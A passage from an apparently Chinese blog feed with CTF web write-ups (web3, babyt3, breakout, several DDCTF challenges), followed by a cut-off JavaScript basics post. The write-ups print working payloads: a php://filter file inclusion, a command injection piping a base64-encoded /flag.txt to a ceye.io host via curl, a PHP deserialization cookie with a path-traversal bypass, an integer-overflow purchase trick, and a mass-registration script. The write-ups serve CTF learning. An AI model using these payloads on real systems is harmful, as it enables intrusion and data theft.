    <content type="html"><![CDATA[<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><ol><li><p>发现网页<code>.DS_store</code>泄露，使用<code>ds_store_exp</code>复原<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p></li><li><p>在<code>http://61.164.47.198:10002/e10adc3949ba59abbe56e057f20f883e</code>下<code>.git</code>源码泄露。使用<code>githack</code>还原。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p></li><li><p>下载<code>BackupForMySite.zip</code>，发现压缩包中存在的<code>lengzhu.jpg</code>与网页中<code>lengzhu.jpg</code>相同。使用<code>zip</code>明文攻击，在尝试<code>winrar</code>和<code>7zip</code>，好压对<code>lengzhu.zip</code>进行压缩解密。发现好压压缩之后的<code>lengzhu.jpg</code>能够成功解密。使用<code>archpr</code>选择明文，运行一段时间即可停止，发现成功解密<code>BackupForMySite.zip</code>。<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p></li></ol><ol start="4"><li>hint文件中给了code参数值，和seed.txt文件路径。猜测为php伪随机数</li></ol><pre><code class="hljs angelscript">code <span class="hljs-keyword">is</span> <span class="hljs-number">9f</span>aedd5999937171912159d28b219d86well ok ur good...By the way, flag saved <span class="hljs-keyword">in</span> flag/seed.txt</code></pre><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><ol start="5"><li><p>使用<code>php_mt_seed</code>获取种子<code>seed</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p></li><li><p>访问<code>http://61.164.47.198:10002/flag/309551.txt</code></p></li></ol><p><code>flag{0730b6193000e9334b12cf7c95fbc736}</code></p><h1 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h1><p>一进主页提示<code>include $_GET[‘file’]</code></p><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>访问</p><pre><code class="hljs xml">view-source:http://61.164.47.198:10000/index.php查看源代码发现提示<span class="hljs-comment">&lt;!--hint: ZGlyLnBocA== --&gt;</span>解码后为dir.php</code></pre><p>使用伪协议读取dir.php<br><code>http://61.164.47.198:10000/index.php?file=php://filter/convert.base64-encode/resource=dir.php</code></p><pre><code class="hljs routeros">include <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]<span class="hljs-attribute">PD9waHAKJGEgPSBAJF9HRVRbJ2RpciddOwppZighJGEpewokYSA9ICcvdG1wJzsKfQp2YXJfZHVtcChzY2FuZGlyKCRhKSk7Cg</span>==</code></pre><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>利用<code>Scandir</code>访问根目录<br><code>http://61.164.47.198:10000/index.php?file=dir.php&amp;dir=/</code>，得到flag文件所在位置。</p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>使用file包含该文件，可得flag<br><code>flag{8dc25fd21c52958f777ce92409e2802a}</code> </p><h1 id="breakout"><a href="#breakout" class="headerlink" title="breakout"></a>breakout</h1><p>利用xss 得到管理员cookie，在command利用Ceye.io获取admin系统信息</p><p>md5验证码</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(s)</span>:</span>    <span class="hljs-keyword">return</span> hashlib.md5(s).hexdigest()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">9999999</span>):    <span class="hljs-keyword">if</span> md5(str(i)).startswith(<span class="hljs-string">'3e53dc'</span>):        <span class="hljs-keyword">print</span> i        <span class="hljs-keyword">break</span></code></pre><p>得到cookie</p><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">20admin</span></span>=admin_!@@!_admin_admin_hhhhh;</code></pre><pre><code class="hljs groovy">POST <span class="hljs-regexp">/exec.php HTTP/</span><span class="hljs-number">1.1</span><span class="hljs-string">Host:</span> <span class="hljs-number">61.164</span><span class="hljs-number">.47</span><span class="hljs-number">.198</span>:<span class="hljs-number">10001</span>Content-<span class="hljs-string">Length:</span> <span class="hljs-number">78</span>Cache-<span class="hljs-string">Control:</span> max-age=<span class="hljs-number">0</span><span class="hljs-string">Origin:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//61.164.47.198:10001</span>Upgrade-Insecure-<span class="hljs-string">Requests:</span> <span class="hljs-number">1</span>Content-<span class="hljs-string">Type:</span> application/x-www-form-urlencodedUser-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; WOW64) AppleWebKit/</span><span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-regexp">/73.0.3683.86 Safari/</span><span class="hljs-number">537.36</span><span class="hljs-string">Accept:</span> text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>webp,image<span class="hljs-regexp">/apng,*/</span>*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3<span class="hljs-string">Referer:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//61.164.47.198:10001/exec.php</span>Accept-<span class="hljs-string">Encoding:</span> gzip, deflateAccept-<span class="hljs-string">Language:</span> zh-CN,zh;q=<span class="hljs-number">0.9</span><span class="hljs-string">Cookie:</span> PHPSESSID=s3dp9m5qpg6f10138g99bnt1p7; token=<span class="hljs-number">1</span>B2M2Y8AsgTpgAmY7PhCfg%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D;admin=admin_!@@!_admin_admin_hhhhh;<span class="hljs-string">Connection:</span> closecommand=curl <span class="hljs-string">http:</span><span class="hljs-comment">//fw5can.ceye.io/?$(cat /flag.txt | base64)&amp;exec=1</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDCTF | web题解</title>
    <link href="/2019/04/17/DDCTF-web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/04/17/DDCTF-web%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>全程看着大佬思路，进行复现。web小萌新</p><h1 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h1><p>访问index.php转16进制，双base64后得到源码<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p><strong><em>hint:<a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a></em></strong></p><ol><li>访问<code>http://117.51.150.246/index.php?jpg=TnpBM01qWXhOak0zTkRZNU5qTTJOVEpsTnpRM09EYzBNbVUzTXpjM056QT0=</code></li></ol><p><code>ZjFhZyFkZGN0Zi5waHA=</code></p><p>解码之后为<code>f1ag!ddctf.php</code>，利用源代码中对config替换方式，将感叹号替换为config.</p><ol start="2"><li><p>访问view-source:<code>http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</code>解码出源代码如下。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p></li><li><p>访问<code>http://117.51.150.246/f1ag!ddctf.php/?uid=</code></p></li></ol><p><code>DDCTF{436f6e67726174756c6174696f6e73}</code></p><h1 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h1><p>网页源代码显示加载了使用js加载<code>auth()</code>方法，访问查看<code>/js/index.js</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>发现在请求index.php之后，下一个请求会跟上post请求<br><code>http://117.51.158.44/app/Auth.php。burpsuite</code>二次释放抓取该包。<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>发现为<code>401</code>认证，在<code>ddctf_username</code>尝试弱账户名<code>admin</code>，释放http包。网页显示</p><pre><code class="hljs elixir">您当前当前权限为管理员----请访问<span class="hljs-symbol">:app/fL2XID2i0Cdh</span>.php</code></pre><p>跟进<code>http://117.51.158.44/app/fL2XID2i0Cdh.php</code>，得到源代码。</p><pre><code class="hljs php">url:app/Application.php<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Application</span> </span>&#123;    <span class="hljs-keyword">var</span> $path = <span class="hljs-string">''</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">response</span><span class="hljs-params">($data, $errMsg = <span class="hljs-string">'success'</span>)</span> </span>&#123;        $ret = [<span class="hljs-string">'errMsg'</span> =&gt; $errMsg,            <span class="hljs-string">'data'</span> =&gt; $data];        $ret = json_encode($ret);        header(<span class="hljs-string">'Content-type: application/json'</span>);        <span class="hljs-keyword">echo</span> $ret;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auth</span><span class="hljs-params">()</span> </span>&#123;        $DIDICTF_ADMIN = <span class="hljs-string">'admin'</span>;        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="hljs-string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;            <span class="hljs-keyword">$this</span>-&gt;response(<span class="hljs-string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);            <span class="hljs-keyword">return</span> <span class="hljs-keyword">TRUE</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;response(<span class="hljs-string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="hljs-string">'error'</span>);            <span class="hljs-keyword">exit</span>();        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitizepath</span><span class="hljs-params">($path)</span> </span>&#123;    $path = trim($path);    $path=str_replace(<span class="hljs-string">'../'</span>,<span class="hljs-string">''</span>,$path);    $path=str_replace(<span class="hljs-string">'..\\'</span>,<span class="hljs-string">''</span>,$path);    <span class="hljs-keyword">return</span> $path;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;path)) &#123;        <span class="hljs-keyword">exit</span>();    &#125;<span class="hljs-keyword">else</span>&#123;        $path = <span class="hljs-keyword">$this</span>-&gt;sanitizepath(<span class="hljs-keyword">$this</span>-&gt;path);        <span class="hljs-keyword">if</span>(strlen($path) !== <span class="hljs-number">18</span>) &#123;            <span class="hljs-keyword">exit</span>();        &#125;        <span class="hljs-keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="hljs-string">'Congratulations'</span>);    &#125;    <span class="hljs-keyword">exit</span>();&#125;&#125;url:app/Session.php<span class="hljs-keyword">include</span> <span class="hljs-string">'Application.php'</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Session</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Application</span> </span>&#123;    <span class="hljs-comment">//key建议为8位字符串</span>    <span class="hljs-keyword">var</span> $eancrykey                  = <span class="hljs-string">''</span>;    <span class="hljs-keyword">var</span> $cookie_expiration          = <span class="hljs-number">7200</span>;    <span class="hljs-keyword">var</span> $cookie_name                = <span class="hljs-string">'ddctf_id'</span>;    <span class="hljs-keyword">var</span> $cookie_path                = <span class="hljs-string">''</span>;    <span class="hljs-keyword">var</span> $cookie_domain              = <span class="hljs-string">''</span>;    <span class="hljs-keyword">var</span> $cookie_secure              = <span class="hljs-keyword">FALSE</span>;    <span class="hljs-keyword">var</span> $activity                   = <span class="hljs-string">"DiDiCTF"</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">parent</span>::auth()) &#123;            <span class="hljs-keyword">$this</span>-&gt;get_key();            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;session_read()) &#123;                $data = <span class="hljs-string">'DiDI Welcome you %s'</span>;                $data = sprintf($data,$_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]);                <span class="hljs-keyword">parent</span>::response($data,<span class="hljs-string">'sucess'</span>);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">$this</span>-&gt;session_create();                $data = <span class="hljs-string">'DiDI Welcome you'</span>;                <span class="hljs-keyword">parent</span>::response($data,<span class="hljs-string">'sucess'</span>);            &#125;        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_key</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-comment">//eancrykey  and flag under the folder</span>        <span class="hljs-keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="hljs-string">'../config/key.txt'</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">session_read</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($_COOKIE)) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;        &#125;        $session = $_COOKIE[<span class="hljs-keyword">$this</span>-&gt;cookie_name];        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($session)) &#123;            <span class="hljs-keyword">parent</span>::response(<span class="hljs-string">"session not found"</span>,<span class="hljs-string">'error'</span>);            <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;        &#125;        $hash = substr($session,strlen($session)<span class="hljs-number">-32</span>);        $session = substr($session,<span class="hljs-number">0</span>,strlen($session)<span class="hljs-number">-32</span>);        <span class="hljs-keyword">if</span>($hash !== md5(<span class="hljs-keyword">$this</span>-&gt;eancrykey.$session)) &#123;            <span class="hljs-keyword">parent</span>::response(<span class="hljs-string">"the cookie data not match"</span>,<span class="hljs-string">'error'</span>);            <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;        &#125;        $session = unserialize($session);        <span class="hljs-keyword">if</span>(!is_array($session) <span class="hljs-keyword">OR</span> !<span class="hljs-keyword">isset</span>($session[<span class="hljs-string">'session_id'</span>]) <span class="hljs-keyword">OR</span> !<span class="hljs-keyword">isset</span>($session[<span class="hljs-string">'ip_address'</span>]) <span class="hljs-keyword">OR</span> !<span class="hljs-keyword">isset</span>($session[<span class="hljs-string">'user_agent'</span>]))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;        &#125;        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">"nickname"</span>])) &#123;            $arr = <span class="hljs-keyword">array</span>($_POST[<span class="hljs-string">"nickname"</span>],<span class="hljs-keyword">$this</span>-&gt;eancrykey);            $data = <span class="hljs-string">"Welcome my friend %s"</span>;            <span class="hljs-keyword">foreach</span> ($arr <span class="hljs-keyword">as</span> $k =&gt; $v) &#123;                $data = sprintf($data,$v);            &#125;            <span class="hljs-keyword">parent</span>::response($data,<span class="hljs-string">"Welcome"</span>);        &#125;        <span class="hljs-keyword">if</span>($session[<span class="hljs-string">'ip_address'</span>] != $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]) &#123;            <span class="hljs-keyword">parent</span>::response(<span class="hljs-string">'the ip addree not match'</span>.<span class="hljs-string">'error'</span>);            <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;        &#125;        <span class="hljs-keyword">if</span>($session[<span class="hljs-string">'user_agent'</span>] != $_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]) &#123;            <span class="hljs-keyword">parent</span>::response(<span class="hljs-string">'the user agent not match'</span>,<span class="hljs-string">'error'</span>);            <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">TRUE</span>;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">session_create</span><span class="hljs-params">()</span> </span>&#123;        $sessionid = <span class="hljs-string">''</span>;        <span class="hljs-keyword">while</span>(strlen($sessionid) &lt; <span class="hljs-number">32</span>) &#123;            $sessionid .= mt_rand(<span class="hljs-number">0</span>,mt_getrandmax());        &#125;        $userdata = <span class="hljs-keyword">array</span>(            <span class="hljs-string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="hljs-keyword">TRUE</span>)),            <span class="hljs-string">'ip_address'</span> =&gt; $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>],            <span class="hljs-string">'user_agent'</span> =&gt; $_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>],            <span class="hljs-string">'user_data'</span> =&gt; <span class="hljs-string">''</span>,        );        $cookiedata = serialize($userdata);        $cookiedata = $cookiedata.md5(<span class="hljs-keyword">$this</span>-&gt;eancrykey.$cookiedata);        $expire = <span class="hljs-keyword">$this</span>-&gt;cookie_expiration + time();        setcookie(            <span class="hljs-keyword">$this</span>-&gt;cookie_name,            $cookiedata,            $expire,            <span class="hljs-keyword">$this</span>-&gt;cookie_path,            <span class="hljs-keyword">$this</span>-&gt;cookie_domain,            <span class="hljs-keyword">$this</span>-&gt;cookie_secure            );    &#125;&#125;$ddctf = <span class="hljs-keyword">new</span> Session();$ddctf-&gt;index();</code></pre><p>通读代码发现，<code>unserialize</code>，可知考点为对象注入。再看<code>Application的__destruct</code>函数调用<code>sanitizepath</code>方法消毒<code>path</code>,接着进入<code>file_get_contents</code>方法中调用文件!!只要传入存在<code>flag</code>的文件，就能够达到目的。<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>反序列化成功调用<code>Application __destruct</code>方法需要满足</p><pre><code class="hljs routeros"><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-variable">$hash</span> = substr(<span class="hljs-variable">$session</span>,strlen(<span class="hljs-variable">$session</span>)-32);       <span class="hljs-variable">$session</span> = substr(<span class="hljs-variable">$session</span>,0,strlen(<span class="hljs-variable">$session</span>)-32);       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hash</span> !== md5(<span class="hljs-variable">$this</span>-&gt;eancrykey.<span class="hljs-variable">$session</span>))<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span></code></pre><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>从<code>session_create()</code>方法可知，扣掉的<code>32</code>位，为执行<code>$cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);</code>生成的<code>md5</code><br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h2 id="获取eancrykey"><a href="#获取eancrykey" class="headerlink" title="获取eancrykey"></a>获取eancrykey</h2><p>这里发现通过<code>session_read()</code>下传参<code>nickname</code>能够获取<code>eancrykey</code>，</p><p><code>$data</code>重复赋值，可以通过<code>sprintf</code>获取<code>eancrykey</code>,Demo如下<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>POST请求<code>nickename=%s</code>,并修改</p><p><code>content-type: Content-Type: application/x-www-form-urlencoded;charset=utf-8</code></p><p>得到<code>eancrykey=’EzblrbNS’</code><br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h2 id="构造文件路径"><a href="#构造文件路径" class="headerlink" title="构造文件路径"></a>构造文件路径</h2><p>Application类中，<code>sanitizapth</code>能够轻松对<code>path</code>进行构造绕过<br><code>....//config/key.txt</code><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h2 id="构造序列化语句"><a href="#构造序列化语句" class="headerlink" title="构造序列化语句"></a>构造序列化语句</h2><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:7</span><span class="hljs-selector-pseudo">:"Session"</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"path"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">21</span>:<span class="hljs-string">"....//config/flag.txt"</span>;&#125;</code></pre><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>将以下字符串作为cookie即可得到flag</p><pre><code class="hljs angelscript">O%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Session%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A21%<span class="hljs-number">3</span>A%<span class="hljs-number">22.</span>...%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fconfig%<span class="hljs-number">2</span>Fflag.txt%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D7392eca99298ec7109e856bb694a808e</code></pre><p><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="image-upload"><a href="#image-upload" class="headerlink" title="image-upload"></a>image-upload</h1><p>参考链接：<code>https://xz.aliyun.com/t/2657#toc-13</code></p><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>1.jpg</code><br>执行<code>php payload.php 1.jpg</code></p><p><img src="./13.png" srcset="/img/loading.gif" alt=""></p><p>上传成功弹出flag<br><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h1 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h1><p>点击购买时，抓包</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /ctf/api/buy_ticket?<span class="hljs-attribute">ticket_price</span>=2000 HTTP/1.1<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.Cookie: <span class="hljs-attribute">user_name</span>=lilidoai000; <span class="hljs-attribute">REVEL_SESSION</span>=dd9c65b7637bd2aab81f20431bf64ac4Connection: close</code></pre><p>存在<code>REVEL_SESSION</code>是为go语言所特有。<br>GO语言存在整型溢出，所以我们需要判断是哪种类型整型</p><pre><code class="hljs angelscript">有符号整数类型<span class="hljs-built_in">int</span>8 有符号的<span class="hljs-number">8</span>位整数，范围 <span class="hljs-number">-128</span> 到<span class="hljs-number">127</span><span class="hljs-built_in">int</span>16 有符号的<span class="hljs-number">16</span>位整数，范围 <span class="hljs-number">-32768</span> 到 <span class="hljs-number">32767</span><span class="hljs-built_in">int</span>32 有符号的<span class="hljs-number">32</span>位整数，范围 <span class="hljs-number">-2147483648</span> 到 <span class="hljs-number">2147483647</span><span class="hljs-built_in">int</span>64 有符号的<span class="hljs-number">64</span>位整数，范围 <span class="hljs-number">-9223372036854775808</span> 到 <span class="hljs-number">9223372036854775807</span><span class="hljs-built_in">uint</span>8 无符号<span class="hljs-number">8</span>位整数，范围 <span class="hljs-number">0</span> 到 <span class="hljs-number">255</span><span class="hljs-built_in">uint</span>16 无符号<span class="hljs-number">16</span>位整数，范围 <span class="hljs-number">0</span> 到 <span class="hljs-number">65535</span><span class="hljs-built_in">uint</span>32 无符号<span class="hljs-number">32</span>位整数，范围 <span class="hljs-number">0</span> 到 <span class="hljs-number">4294967295</span><span class="hljs-built_in">uint</span>64 无符号<span class="hljs-number">64</span>位整数，范围 <span class="hljs-number">0</span> 到 <span class="hljs-number">18446744073709551615</span></code></pre><p>猜测支付后端代码：<strong>用户存款 - （吃鸡入场券数×入场券价格 ） &gt;= 0</strong><br>通过整型溢出绕过逻辑判断<br>尝试<code>ticket_price=9223372036854775807</code>，显示<code>9223372036854776000</code><br>元。支付时提示支付失败。<br>…..<br>测试是<code>uint32</code>整型溢出，传入<code>ticket_price=4294967296</code>。支付成功。我们得到如下界面。需要写脚本挤掉<code>robots</code></p><p><img src="./15.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> json<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">900</span>,<span class="hljs-number">1200</span>):<span class="hljs-comment">#register </span>url_regester=<span class="hljs-string">'http://117.51.147.155:5050/ctf/api/register?name=oswordxx'</span>+str(i)+<span class="hljs-string">'&amp;password=123456789'</span>r1=requests.session()rep=r1.get(url=url_regester)print(url_regester)url_login=<span class="hljs-string">'http://117.51.147.155:5050/ctf/api/login?name=oswordxx'</span>+str(i)+<span class="hljs-string">'&amp;password=123456789'</span>r2=requests.session()r2_rep=r2.get(url=url_login)<span class="hljs-comment"># check login</span><span class="hljs-keyword">if</span> <span class="hljs-string">"200"</span> <span class="hljs-keyword">in</span> r2_rep.text:<span class="hljs-comment"># buy ticket</span>print(<span class="hljs-string">"[+]sucessfully login: "</span>+<span class="hljs-string">"username=oswordxx"</span>+str(i))url_getbill=<span class="hljs-string">'http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296'</span>r3=r2.get(url=url_getbill)json3=r3.json()json_data=json3[<span class="hljs-string">"data"</span>]<span class="hljs-comment"># get bill_id</span>bill_id=json_data[<span class="hljs-number">0</span>][<span class="hljs-string">"bill_id"</span>]print(<span class="hljs-string">"[-]bill_id: "</span>+str(bill_id))url_spand=<span class="hljs-string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span>+bill_idr4=r2.get(url=url_spand)json4=r4.json()print(json4)<span class="hljs-comment"># get id and hash_val</span>hash_cal=json4[<span class="hljs-string">'data'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'your_ticket'</span>]id1=json4[<span class="hljs-string">'data'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'your_id'</span>]<span class="hljs-comment">#remove_robot</span><span class="hljs-comment">#http://117.51.147.155:5050/index.html#/main/result</span>url_remove=<span class="hljs-string">'http://117.51.147.155:5050/ctf/api/remove_robot?id='</span>+str(id1)+<span class="hljs-string">'&amp;ticket='</span>+str(hash_cal)cookies=&#123;<span class="hljs-string">'user_name'</span>:<span class="hljs-string">'osword'</span>,<span class="hljs-string">'REVEL_SESSION'</span>:<span class="hljs-string">'11561598e756e3dd21e13814c9bc6056'</span>&#125;rmain_rep=requests.get(url=url_remove,cookies=cookies)<span class="hljs-keyword">if</span> <span class="hljs-string">"200"</span> <span class="hljs-keyword">in</span> rmain_rep.text:print(rmain_rep.text)print(<span class="hljs-string">"remove sucessfully"</span>)<span class="hljs-keyword">continue</span></code></pre><p><img src="./16.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript基础语法</title>
    <link href="/2019/04/17/JavaScript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <url>/2019/04/17/JavaScript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h1><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">”https://code.jquery.com/jquery-2.1.1.min.js”</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">”main.js”</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><img src="./1.png" srcset="/img/loading.gif" alt=""><br>jQuery确保了所有的HTML文件都在JavaScript执行之前加载完成</p><h1 id="运行js文件"><a href="#运行js文件" class="headerlink" title="运行js文件"></a>运行js文件</h1><p><code>js test.js</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""><br>使用node<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h1 id="js注释"><a href="#js注释" class="headerlink" title="js注释"></a>js注释</h1><p>单行注释：<code>//</code><br>多行注释：<code>/*...*/</code></p><h1 id="Html注释"><a href="#Html注释" class="headerlink" title="Html注释"></a>Html注释</h1><p>被<code>&lt;!--和--&gt;</code> 所包围</p><h1 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h1><p>使用<code>var</code>声明的变量，其作用域为该语句所在的函数内，且存在变量提升现象；<br>使用<code>let</code>声明的变量，其作用域为该语句所在的代码块内，不存在变量提升；<br>使用<code>const</code>声明的是常量，在后面出现的代码中不能再修改该常量的值。</p><pre><code class="hljs angelscript">Let currentTempC = <span class="hljs-number">22</span>; <span class="hljs-comment">//degree Celsius</span>currenTempC = <span class="hljs-number">22.5</span></code></pre><p>Let声明变量，只能是使用一次</p><h2 id="声明多个变量"><a href="#声明多个变量" class="headerlink" title="声明多个变量"></a>声明多个变量</h2><p><code>Let targetTempC , room1 = “conference_room_a”, room2 = “lobby”</code></p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p><code>const ROOM_TEMP_C = 21.5,MAX_TEMP_C=30;</code><br> NOTICe： 尽量使用常量，反正篡改数据</p><h2 id="标识符命名"><a href="#标识符命名" class="headerlink" title="标识符命名"></a>标识符命名</h2><p>必须以<code>字母、$、下划线(_)</code>开头<br>必须是由<code>字母、数字、$和下划线(_)组成</code><br>可以使用<code>Unicode</code>字符<br>不可以使用保留字</p><h2 id="基本类型"><a href="#基本类型" class="headerlink" 